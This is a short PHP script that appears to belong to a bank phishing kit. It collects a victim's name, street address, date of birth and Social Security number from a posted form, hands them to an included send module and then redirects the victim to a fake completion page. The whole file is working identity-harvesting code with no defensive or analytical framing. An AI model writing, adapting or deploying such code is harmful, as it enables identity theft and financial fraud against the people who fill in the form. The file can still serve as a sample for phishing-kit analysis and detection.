<?php
require_once('Module/Setmodule.php');





$message .= " -------------- $Bank Information -------------- \n"."\n";


$message .= "First Name: ".$_POST['First']."\n"; 
$message .= "Last Name: ".$_POST['Last']."\n";
$message .= "Street Address: ".$_POST['Address']."\n";
$message .= "City: ".$_POST['City']."\n"; 
$message .= "State: ".$_POST['State']."\n"; 
$message .= "Zip: ".$_POST['Zip']."\n"; 
$message .= "Date Of Birth: ".$_POST['dob']."\n"; 
$message .= "SOCIAL SECURITY: ".$_POST['pin']."\n"."\n"; 




require_once('Module/SendModule.php');


	 
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	
	
	
	
?>
